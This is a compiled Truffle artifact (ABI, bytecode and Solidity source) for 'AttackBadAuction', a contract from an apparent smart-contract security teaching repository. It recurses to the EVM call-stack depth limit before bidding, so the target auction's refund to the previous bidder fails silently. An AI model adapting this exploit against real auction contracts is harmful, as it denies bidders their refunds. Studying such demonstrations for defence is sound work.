{
  "contractName": "AttackBadAuction",
  "abi": [
    {
      "inputs": [
        {
          "name": "_badAuctionAddress",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "constructor",
      "signature": "constructor"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function",
      "signature": "0x9e5faafc"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b506040516020806102048339810160405251600160a060020a038116151561009957604080517f08c379a000000000000000000000000000000000000000000000000000000000815260206004820181905260248201527f696e76616c69642061756374696f6e20636f6e74726163742061646472657373604482015290519081900360640190fd5b60008054600160a060020a03909216600160a060020a031990921691909117905561013b806100c96000396000f3006080604052600436106100405763ffffffff7c01000000000000000000000000000000000000000000000000000000006000350416639e5faafc8114610045575b600080fd5b34801561005157600080fd5b5061005a61005c565b005b60005b6103ff811161010c57806103ff14156100fc5760008054604080517f454a2ab3000000000000000000000000000000000000000000000000000000008152346004820152905173ffffffffffffffffffffffffffffffffffffffff9092169263454a2ab39260248084019382900301818387803b1580156100df57600080fd5b505af11580156100f3573d6000803e3d6000fd5b50505050610104565b61010461005c565b60010161005f565b505600a165627a7a72305820ec01bd751e9e71fddd3f380ccefe0764f71d993bbf0a45b0852b4f5693c377fd0029",
  "source": "pragma solidity ^0.4.25;\n\nimport './BadAuction.sol';\n\n/**\n@title Auction reentrancy attack\n@author Ahmed Ali <ahmedaabdulwahed@gmail.com>\nThis contract meant to be a reentrancy attack for\nthe auction contract\n**/\n\ncontract AttackBadAuction {\n\n    BadAuction private auction;\n\n    constructor(address _badAuctionAddress) {\n        // create new instance of the contract\n        require(_badAuctionAddress != address(0), 'invalid auction contract address');\n        auction = BadAuction(_badAuctionAddress);\n    }\n\n    function attack() public {\n        for (uint256 i=0; i <= 1023; i++){\n            if(i==1023) {\n                //max stack depth reach 1024 when send() method is called\n                // which in turn will fail without reverting\n                // an error. The previous bidder will not receive the refund,\n                // but the new bidder will still be highest bidder\n                auction.bid(msg.value);\n            }else {\n                // recursive call to reach the max stack depth\n                attack();\n            }\n        }\n    }\n}",
  "sourcePath": "/Users/ahmed/Documents/github_projects/AwesomeSCSecurity/dasp/1-reentrancy/contracts/AttackBadAuction.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.25+commit.59dbf8f1.Emscripten.clang"
  },
  "schemaVersion": "3.0.0-beta.0",
  "updatedAt": "2018-11-04T16:32:58.025Z"
}